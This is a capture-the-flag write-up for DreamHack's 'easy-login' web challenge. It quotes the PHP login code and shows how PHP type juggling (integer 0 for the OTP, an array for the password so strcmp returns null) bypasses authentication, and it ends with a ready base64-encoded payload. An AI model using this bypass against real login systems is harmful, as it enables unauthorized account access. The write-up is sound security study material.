# easy-login — DreamHack

> **Room / Challenge:** easy-login (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** easy-login (web)
- **Link**: `https://dreamhack.io/wargame/challenges/1213`
- **Level:** `2`
- **Date:** `17-11-2025`

---

## Goal

Login as admin to get the flag.

## My Solution

This is the PHP code in `index.php` which validates our credentials:

```php
<?php

function generatePassword($length) {
    $characters = '0123456789abcdef';
    $charactersLength = strlen($characters);
    $pw = '';
    for ($i = 0; $i < $length; $i++) {
        $pw .= $characters[random_int(0, $charactersLength - 1)];
    }
    return $pw;
}

function generateOTP() {
    return 'P' . str_pad(strval(random_int(0, 999999)), 6, "0", STR_PAD_LEFT);
}

$admin_pw = generatePassword(32);
$otp = generateOTP();

function login() {
    if (!isset($_POST['cred'])) {
        echo "Please login...";
        return;
    }

    if (!($cred = base64_decode($_POST['cred']))) {
        echo "Cred error";
        return;
    }

    if (!($cred = json_decode($cred, true))) {
        echo "Cred error";
        return;
    }

    if (!(isset($cred['id']) && isset($cred['pw']) && isset($cred['otp']))) {
        echo "Cred error";
        return;
    }

    if ($cred['id'] != 'admin') {
        echo "Hello," . $cred['id'];
        return;
    }

    if ($cred['otp'] != $GLOBALS['otp']) {
        echo "OTP fail";
        return;
    }

    if (!strcmp($cred['pw'], $GLOBALS['admin_pw'])) {
        require_once('flag.php');
        echo "Hello, admin! get the flag: " . $flag;
        return;
    }

    echo "Password fail";
    return;
}

?>
```

The problem is this every new request will be compared to new password and OTP so it is impossible to guess/brute-force the creds:

```php
function generatePassword($length) {
    $characters = '0123456789abcdef';
    $charactersLength = strlen($characters);
    $pw = '';
    for ($i = 0; $i < $length; $i++) {
        $pw .= $characters[random_int(0, $charactersLength - 1)];
    }
    return $pw;
}

function generateOTP() {
    return 'P' . str_pad(strval(random_int(0, 999999)), 6, "0", STR_PAD_LEFT);
}
```

Without knowing the valid creds, we can still bypass the login checks, it check our OTP with this if command:

```php
if ($cred['otp'] != $GLOBALS['otp']) {
    echo "OTP fail";
    return;
}
```

This will check our input otp with the random otp with string `'Pxxxxxx'` so we can add an input with an integer: `0`. The check becomes:

```
0 != "Pxxxxxx"
```

Which PHP evaluates this as `0 != 0`, which is `false`.

The check of `pw`:

```php
if (!strcmp($cred['pw'], $GLOBALS['admin_pw'])) {
    require_once('flag.php');
    echo "Hello, admin! get the flag: " . $flag;
    return;
}
```

It takes our `pw` and compare it to the `admin_pw`, the vulnerability here is `strcmp`, we can bypass this with the payload `[]`, the check will become `strcmp([], "a_random_password_string")`. It will return `null` and `!null` becomes `true`. Our final payload:

```json
{
  "id": "admin",
  "pw": [],
  "otp": 0
}
```

Encode this with base64 for the correct `cred` input:

```
ewogICAgImlkIjogImFkbWluIiwKICAgICJwdyI6IFtdLAogICAgIm90cCI6IDAKfQ==
```

Make a `curl` request to bypass the checks and get the flag:
![Guide image](./screenshots/1.png)
